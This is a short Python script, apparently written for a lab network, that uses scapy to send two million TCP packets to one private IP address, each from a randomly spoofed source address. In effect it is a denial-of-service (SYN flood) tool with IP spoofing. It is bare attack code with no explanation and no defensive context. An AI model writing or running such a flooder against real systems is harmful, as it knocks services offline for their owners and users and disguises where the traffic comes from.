from scapy.all import *
import random

p=IP()/TCP()
p.dst="192.168.208.215"

for i in range(2000000):
    byte1=random.randint(1,254)
    byte2=random.randint(1,254)
    byte3=random.randint(1,254)
    byte4=random.randint(1,254)
    str1=str(byte1)
    str2=str(byte2)
    str3=str(byte3)
    str4=str(byte4)
    p.src=f"{str1}.{str2}.{str3}.{str4}"
    print(f"{str1}.{str2}.{str3}.{str4}")
    send(p, verbose=0)